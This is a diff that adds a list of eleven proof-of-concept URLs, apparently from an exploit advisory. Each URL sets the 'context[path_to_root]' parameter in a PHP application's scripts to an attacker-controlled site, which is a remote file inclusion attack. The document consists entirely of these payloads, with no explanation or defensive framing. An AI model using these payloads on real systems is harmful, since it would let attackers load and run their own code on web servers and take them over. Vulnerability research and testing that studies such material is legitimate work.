@@ -1,0 +1,11 @@
+http://www.example.com/articles/article.php?context[path_to_root]=attacker's site
+http://www.example.com/articles/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/categories/category.php?context[path_to_root]=attacker's site
+http://www.example.com/categories/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/comments/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/files/file.php?context[path_to_root]=attacker's site
+http://www.example.com/sections/section.php?context[path_to_root]=attacker's site
+http://www.example.com/sections/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/tables/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/users/user.php?context[path_to_root]=attacker's site
+http://www.example.com/users/populate.php?context[path_to_root]=attacker's site
